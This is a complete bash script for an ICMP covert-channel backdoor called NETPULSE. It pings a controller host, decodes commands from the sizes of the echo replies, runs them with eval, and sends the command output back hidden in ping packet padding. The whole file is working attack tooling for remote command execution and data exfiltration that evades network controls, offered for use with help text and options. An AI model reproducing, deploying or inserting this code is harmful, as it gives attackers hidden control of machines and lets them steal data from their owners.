#!/bin/bash

version="0.0.1"

ping_timeout=0.5
verification=true
max_padding_size=15
check_failed=false

show_help() {
    echo '   _   _  _____ ___________ _   _ _      _____ _____  '
    echo '   | \ | ||  ___|_   _| ___ \ | | | |    /  ___|  ___|'
    echo '   |  \| || |__   | | | |_/ / | | | |    \ `--.| |__  '
    echo '   | . ` ||  __|  | | |  __/| | | | |     `--. \  __| '
    echo '   | |\  || |___  | | | |   | |_| | |____/\__/ / |___ '
    echo '   \_| \_/\____/  \_/ \_|    \___/\_____/\____/\____/ '
    echo ""
    echo "   v$version - github.com/ch0d/netpulse           "
    echo "                                                      "
    echo ""
    echo "usage: $0 [options] <host>"
    echo ""
    echo "  -h                  display this help message and exit"
    echo "  -t <sec>            default ping timeout"
    echo "  -n                  do not perform integrity check"
    echo "  -p <size>           maximum packet size in bytes to send"
    echo "  -T <sec>            set a timeout in seconds for commands"
    echo "                      (recommended to prevent the shell from freezing)."
}

while getopts "ht:np:T:" opt; do
    case $opt in
    h)
        show_help
        exit 0
        ;;
    t)
        ping_timeout="$OPTARG"
        ;;
    p)
        max_padding_size="$OPTARG"
        ;;
    n)
        verification=false
        ;;
    T)
        command_timeout="$OPTARG"
        ;;
    \?)
        show_help
        exit 1
        ;;
    esac
done

shift $((OPTIND - 1))

if [ $# -eq 0 ]; then
    echo "Error: the <host> is required." >&2
    show_help
    exit 1
fi

host="$1"

check_payload() {
    local value="$1"
    if [[ "$value" =~ ^[0-9]+$ ]]; then
        return 0
    else
        return 1
    fi
}

listener() {
    pkt_send=1
    while [ true ]; do
        echo -n "[*] Waiting for a response from the host ($host)... $pkt_send" $'packets sent\r'

        payload_len=$(ping -n -W $ping_timeout -c 1 $host 2>/dev/null | grep "bytes from" | cut -d " " -f1)
        ((pkt_send+=1))
        if check_payload "$payload_len"; then
            u_bytes=$payload_len
            echo "[+] Connection established."
            echo "[-] $u_bytes insignificant bytes in the packets."
            break
        fi
    done
    while [ true ]; do
        payload_len=$(ping -n -W $ping_timeout -c 1 $host 2>/dev/null | grep "bytes from" | cut -d " " -f1)
        if check_payload "$payload_len"; then
            payload_len=$(($payload_len - $u_bytes))
            payload="$payload $payload_len"

            if [ $payload_len -eq 0 ]; then
                payload=($payload)

                for dec in "${payload[@]}"; do
                    if [ $dec -eq 0 ]; then
                        break
                    fi
                    char=$(printf "\\$(printf '%03o' "$dec")")
                    command="${command}${char}"
                done

                checksum=$(echo -n "$command" | cut -d ":" -f1)
                command=$(echo -n "$command" | cut -d ":" -f2-)

                echo "[-] Command received from the host ($host): $command"

                if [ $verification == true ] && [ "$checksum" != "#" ]; then
                    result=$(echo -n "$command" | sha1sum | cut -d " " -f1)
                    if [ "$result" != "$checksum" ]; then
                        echo "[!] Error occurred during checksum verification! [ $result != $checksum ]"
                        output="[NETPULSE MESSAGE] Command cannot be executed because the target-side checksum failed."
                        check_failed=true
                    fi
                fi

                if [ $check_failed == false ]; then
                    if [ -z $command_timeout ]; then
                        output=$(eval "$command" 2>&1)
                    else
                        output=$(eval "timeout --preserve-status -s 9 $command_timeout $command" 2>&1)
                    fi
                else
                    check_failed=false
                fi

                if [ $verification == true ]; then
                    data_checksum=$(echo -n "$output" | sha1sum | cut -d " " -f1)
                else
                    data_checksum="#"
                fi

                output="$data_checksum:$output"

                output_size=${#output}

                echo "Sending $output_size bytes to the host..."

                for ((i = 0; i < output_size; i += max_padding_size)); do
                    padding="${output:$i:$max_padding_size}"
                    padding_size=${#padding}
                    hex_padding=$(printf '%s' "$padding" | xxd -p | tr -d '\n')
                    ping -n -c 1 -q -p "$hex_padding" -s $padding_size $host >/dev/null
                done

                ping -n -c 1 -s 0 $host >/dev/null
            
                payload=""
                command=""
                output=""

                echo "[+] Output transmission complete."
            fi
        fi
    done
}

listener
